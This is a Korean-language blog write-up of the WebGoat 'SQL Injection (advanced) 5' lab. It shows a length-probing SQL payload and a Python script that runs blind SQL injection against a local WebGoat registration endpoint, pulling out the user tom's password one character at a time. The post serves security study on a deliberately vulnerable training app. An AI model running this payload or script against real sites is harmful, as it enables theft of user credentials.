---
layout: single
title: "WebGoat SQL Injection (advanced) 5"
date: 2024-12-21 13:50 +0900
categories: 
    - WEB-study
tag:
typora-root-url: ../
toc: true
toc_sticky: true
toc_label: 목차
author_profile: true
comment: true
sidebar:
    nav: "docs"
---

## SQL Injection (advanced) 5번 문제

5번 문제는 로그인과 회원가입 기능이 존재한다.

![{09B9EE2E-B6C3-4C06-901D-6B2A52589C70}](/images/2024-12-21-WEBgoat/{09B9EE2E-B6C3-4C06-901D-6B2A52589C70}.png)

<br>

tom이라는 이름으로 비밀번호를 Blind SQLi로 알아내야 하는데 회원가입 기능에서 보면 tom 이라는 이름으로 로그인할 때 이미 존재한다는 응답으로 보았을 때 select문을 이용해서 아이디 중복을 체크한다는 것을 알 수 있다.

![{B3119549-20DE-42C6-826C-3B361A35C3D7}](/images/2024-12-21-WEBgoat/{B3119549-20DE-42C6-826C-3B361A35C3D7}.png)

<br>

버프로 패킷을 캡처해보면 아래와 같다. `username_reg` 에 싱글쿼터를 넣어서 확인했을 때 응답이 살짝 다르고, `t'||'om` 이렇게 테스트 해보면 sqli가 가능할 것으로 보인다. 또한 password_reg로 보았을 때 패스워드 컬럼 이름이 `password`일 수도 있다는 것을 예상할 수 있다.

![{A0F5302D-95D2-49BB-B926-26BEFDF88385}](/images/2024-12-21-WEBgoat/{A0F5302D-95D2-49BB-B926-26BEFDF88385}.png)

![{1C52F911-BADA-4FA7-8D42-8708D256B3BF}](/images/2024-12-21-WEBgoat/{1C52F911-BADA-4FA7-8D42-8708D256B3BF}.png)

![{3BC0BD2C-5F49-4943-BBD0-62B303BA9D01}](/images/2024-12-21-WEBgoat/{3BC0BD2C-5F49-4943-BBD0-62B303BA9D01}.png)

<br>

blind sqli를 하기 위해 먼저 password의 길이를 아래와 같은 페이로드로 응답 값을 확인하여 확인해보면 23자리인 것을 알 수 있다.

```sql
'tom and length(password)>0--
```

<br>

blind sqli를 파이썬으로 코드를 짜면 패킷 응답을 확인하기 위해서 로깅이란 걸 설정해주었고, 패스워드 자리 수가 23자리이고 아스키코드로 65~127 사이에 있는 값으로 응답이 다른 것을 아래와 같이 코드로 짜주면 된다.

```python
import requests
import logging

# 로깅 설정
logging.basicConfig(level=logging.DEBUG)

# 세션 유지
session = requests.Session()

session.cookies.set("JSESSIONID", "mVd2rNBS_4szRsFdIWXxn42vrzIPyodLSJ5IZkWS")

password = ''
for a in range(1, 24):
    for i in range(65, 128):
        # SQL Injection 요청
        payload = f"tom' and ascii(substring(password,{a},1))>{i}-- "
        url = 'http://127.0.0.1:5555/WebGoat/SqlInjectionAdvanced/challenge'
        data = {
            "username_reg": payload,
            "email_reg": "test@naver.com",
            "password_reg": "test",
            "confirm_password_reg": "test"
        }

        # PUT 요청
        response = session.put(url, data=data)

        if "already" not in response.text:
            print(f"패스워드 {a} 번째 자리 수 아스키 코드는 {i}입니다.")
            password += chr(i)
            print(f"현재 패스워드: {password}")
            break
            
```

![{41904E80-227A-4528-B4E7-B25324CB1BDE}](/images/2024-12-21-WEBgoat/{41904E80-227A-4528-B4E7-B25324CB1BDE}.png)